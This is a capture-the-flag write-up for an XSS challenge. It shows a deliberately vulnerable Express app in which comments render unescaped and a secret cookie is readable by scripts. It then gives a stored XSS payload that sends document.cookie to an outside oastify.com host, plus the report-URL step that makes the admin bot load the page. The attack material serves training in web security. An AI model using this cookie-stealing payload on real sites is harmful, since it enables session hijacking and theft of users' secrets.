## js code

<details>
  <summary>js code</summary>

const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const puppeteer = require('puppeteer');

// --------------------------------------------------Auxiliary Code
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: true
}));

app.use((req, res, next) => {
    if (!req.session.csrfToken) {
        req.session.csrfToken = generateCSRFToken();
    }
    next();
});

const crypto = require('crypto');

function generateCSRFToken() {
    return crypto.randomBytes(32).toString('hex');
}

function verifyCSRF(req, res) {
    const tokenFromBody = req.body._csrf;
    const tokenFromSession = req.session.csrfToken;
    return tokenFromBody && tokenFromSession && tokenFromBody === tokenFromSession;
}

function escapeHTML(str) {
    return String(str).replace(/[&<>"'`=\/]/g, function (char) {
        return {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '`': '&#x60;',
            '=': '&#x3D;',
            '/': '&#x2F;'
        }[char];
    });
}

// Insecure in-memory users database, only for XSS challenge purposes
const users = {
    alice: { username: 'alice', password: 'pass', bio: 'Hi, I am Alice!' },
    bob: { username: 'bob', password: process.env.BOB_PASS, bio: 'Hello from Bob!' }
};

let sharedComments = [];

function isAuthenticated(req) {
    return req.session && req.session.username && users[req.session.username];
}

function renderHTML(filePath, replacements = {}) {
    let content = fs.readFileSync(path.join(__dirname, 'public', filePath), 'utf-8');
    for (let key in replacements) {
        const regex = new RegExp(`{{${key}}}`, 'g');
        content = content.replace(regex, replacements[key]);
    }
    return content;
}

// -------------------------------------------- Routes

app.get('/', (req, res) => {
    if (isAuthenticated(req)) return res.redirect('/profile');
    res.send(renderHTML('login.html', { error: '' }));
});

// Insecure login flow, only for XSS challenge purposes
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (users[username] && users[username].password === password) {
        req.session.username = username;

        // Set masterkey cookie
        let masterKeyValue = '';

        if (username === 'alice') {
            masterKeyValue = 'DEMOMASTERKEY';
        } else if (username === 'bob') {
            try {
                masterKeyValue = fs.readFileSync('/tmp/masterkey.txt', 'utf8').trim();
            } catch (err) {
                console.error('[!] Failed to read /tmp/masterkey.txt:', err);
                masterKeyValue = 'ERROR';
            }
        }

        res.cookie('masterkey', masterKeyValue, {
            httpOnly: false, // Accessible by javascript code
        });

        return res.redirect('/profile');
    }

    res.send(renderHTML('login.html', { error: '<p class="error">Invalid credentials</p>', csrfToken: req.session.csrfToken }));
});

app.get('/profile', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    const user = users[req.session.username];
    res.send(renderHTML('profile.html', {
        username: escapeHTML(user.username),
        bio: escapeHTML(user.bio),
        csrfToken: req.session.csrfToken}));
});

app.post('/profile', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    if (!verifyCSRF(req, res)) return res.status(403).send('Invalid CSRF token');
    const { bio, password } = req.body;
    const user = users[req.session.username];
    user.bio = bio;
    if (password && password.trim()) user.password = password;
    res.redirect('/profile');
});

app.get('/shared', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    const commentHTML = sharedComments.map(c =>
        `<li><strong>${escapeHTML(c.author)}:</strong> ${c.text}</li>`
    ).join('');
    res.send(renderHTML('shared.html', { comments: commentHTML, csrfToken: req.session.csrfToken }));
});

app.post('/shared', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    if (!verifyCSRF(req, res)) return res.status(403).send('Invalid CSRF token');
    const comment = {
        author: req.session.username,
        text: req.body.comment
    };
    sharedComments.push(comment);
    res.redirect('/shared');
});

app.get('/search', (req, res) => {
    if (!isAuthenticated(req)) return res.status(401).send('Unauthorized');

    const query = req.query.query || '';
    if (!query) return res.status(400).send('Query parameter is required');

    const results = sharedComments.filter(c => 
        c.text.includes(query)
    );

    let html = `<h2>Search Results for "${escapeHTML(query)}"</h2>`;
    if (results.length === 0) {
        html += `<p>No matches found.</p>`;
    } else {
        html += '<ul>';
        results.forEach(c => {
            html += `<li><strong>${escapeHTML(c.author)}:</strong> ${escapeHTML(c.text)}</li>`;
        });
        html += '</ul>';
    }

    html += `<br><a href="/shared">Back to Shared Area</a>`;
    res.send(html);
});

app.get('/logout', (req, res) => {
    req.session.destroy(() => {
        res.redirect('/');
    });
});

app.get('/report', async (req, res) => {
    const targetUrl = 'http://localhost/shared';

    // Respond immediately so the user doesn’t wait
    res.send('Bob is checking it out...');
/*
    .
    .
    .
    . BOB AUTOMATED LOGIN AND VISIT CODE
    .
    .
    .
*/
});

app.listen(80, () => {
    console.log('Running on http://localhost:80');
});

  
</details>

---
----

### note that `httponly` is false

```javascript
        res.cookie('masterkey', masterKeyValue, {
            httpOnly: false, // Accessible by javascript code
        });
```

### note that comments are not filtered

 found  **` ${c.text}`**

```javascript
app.get('/shared', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    const commentHTML = sharedComments.map(c =>
        `<li><strong>${escapeHTML(c.author)}:</strong> ${c.text}</li>`
    ).join('');
    res.send(renderHTML('shared.html', { comments: commentHTML, csrfToken: req.session.csrfToken }));
});
```

## put payload in comment

```javascript
<script>
  var i = new Image();
  i.src = "http://j3nztlrfmpkyc2gtlbapa5dho8uzip6e.oastify.com/?" + document.cookie;
</script>
```

> now if anyone visit the page will send it's cookie to us 

<img width="1853" height="708" alt="image" src="https://github.com/user-attachments/assets/90837eb7-41a2-4794-9ed7-a8e00a301e54" />

## make `bob` visit **`/shared`** to make payload work on him

```url
http://3.255.167.182/report?url=http://localhost/shared
```

<img width="1886" height="670" alt="image" src="https://github.com/user-attachments/assets/3c13727a-ed72-43a8-ae49-18f73f0f7078" />

```
c7b9605f9d8e1lb8bbc7d3024bdanb49 
```

